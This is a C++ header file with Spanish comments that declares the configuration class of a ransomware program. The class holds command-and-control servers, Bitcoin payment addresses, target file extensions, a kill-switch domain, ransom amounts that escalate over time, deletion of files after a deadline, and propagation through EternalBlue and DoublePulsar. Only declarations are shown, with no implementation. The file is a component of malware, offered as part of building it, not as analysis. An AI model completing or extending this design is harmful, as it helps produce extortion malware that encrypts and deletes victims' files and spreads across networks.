#ifndef CONFIG_HPP
#define CONFIG_HPP

#include <string>
#include <vector>
#include <map>
#include <memory>
#include <mutex>
#include <fstream>
// #include <json/json.hpp>

/**
 * @class Config
 * @brief Gestiona la configuración global del ransomware.
 *
 * Esta clase implementa el patrón Singleton para garantizar una única instancia
 * de configuración en todo el sistema. Proporciona acceso a parámetros
 * de configuración, tanto predefinidos como los obtenidos dinámicamente.
 */

class Config
{
private:
    // Singleton pattern
    static std::shared_ptr<Config> instance;
    static std::mutex instanceMutex;

    // Datos de configuración
    std::map<std::string, std::string> stringConfig;
    std::map<std::string, int> intConfig;
    std::map<std::string, bool> boolConfig;
    std::map<std::string, std::vector<std::string>> listConfig;

    // Parámetros críticos
    std::vector<std::string> c2Servers;        // Servidores de comando y control
    std::vector<std::string> bitcoinAddresses; // Direcciones de pago
    std::vector<std::string> targetExtensions; // Extensiones de archivo a cifrar
    std::string killSwitchDomain;              // Dominio kill switch
    std::string mutexName;                     // Nombre del mutex para evitar múltiples infecciones

    // Parámetros de comportamiento
    int initialRansomAmount;      // Cantidad inicial del rescate en USD
    int ransomIncreaseAmount;     // Incremento del rescate tras expiración
    int initialTimeLimit;         // Tiempo inicial antes de incrementar el rescate (horas)
    int secondaryTimeLimit;       // Tiempo secundario antes de eliminar archivis (horas)
    bool deleteFilesAfterTimeout; // Si se eliminarán archivos tras expiración final

    // Parámetros técnicos
    int maxThreads;            // Máximo número de hilos para cifrado
    int maxNetworkConnections; // Máximo de conexiones de red simultáneas
    int c2ConnectionRetries;   // Intentos de conexión a C2
    bool useDoublePulsar;      // Usar DoublePulsar para propagación
    bool useEternalBlue;       // Usar EternalBlue para explotar vulnerabilidades

    // Encriptación
    std::string rsaPublicKey; // Clave pública RSA para cifrado
    int aesKeySize;           // Tamaño de clave AES (128, 192, 256)

    // Idiomas disponibles para la UI
    std::vector<std::string> availableLanguages;

    // Constructor privado (singleton)
    Config();

    // Métodos privados
    void loadDefaultConfiguration();
    bool loadConfigurationFromFile(const std::string &path);
    bool loadConfigurationFromResource();
    void obfuscateStrings();

public:
    // Singleton accessor
    static std::shared_ptr<Config> getInstance();

    // Destructor
    ~Config();

    // Desactivar copia y asignación
    Config(const Config &) = delete;
    Config &operator=(const Config &) = delete;

    // Métodos de acceso general
    std::string getString(const std::string &key, const std::string &defaultValue = "") const;
    int getInt(const std::string &key, int defaultValue = 0) const;
    bool getBool(const std::string &key, bool defaultValue = false) const;
    std::vector<std::string> getStringList(const std::string &key) const;

    // Métodos específicos para acceder a configuraciones críticas
    std::vector<std::string> getC2Servers() const;
    std::string getRandomC2Server() const;
    std::vector<std::string> getBicoinAddresses() const;
    std::string getRandomBitcoinAddress() const;
    std::string getKillSwitchDomain() const;
    std::string getMutexName() const;

    // Métodos para parámetros de comportamiento
    int getInitialRansomAmount() const;
    int getRansomIncreaseAmount() const;
    int getInitialTimeLimit() const;
    int getSecondaryTimeLimit() const;
    bool shouldDeleteFileAfterTimeout() const;

    // Métodos para parámetros técnicos
    int getMaxThreads() const;
    int getMaxNetworkConnections() const;
    int getC2ConnectionRetries() const;
    bool shouldUseDoublePulsar() const;
    bool shouldUsedEternalBlue() const;

    // Métodos para parámetros de encriptación
    std::string getRSAPublicKey() const;
    int getAESKeySize() const;

    // Métodos para idiomas;
    std::vector<std::string> getAvailableLanguages() const;

    // Métodos para actualización dinámica de configuración
    bool updateConfigFromC2(const std::string &jsonConfig);
    void setString(const std::string &key, const std::string &value);
    void setInt(const std::string &key, int value);
    void setBool(const std::string &key, bool value);
    void addToStringList(const std::string &key, const std::string &value);
    void removeFromStringList(const std::string &key, const std::string &value);

    // Persistencia
    bool saveCurrentConfig(const std::string &path);
};

#endif // CONFIG_HPP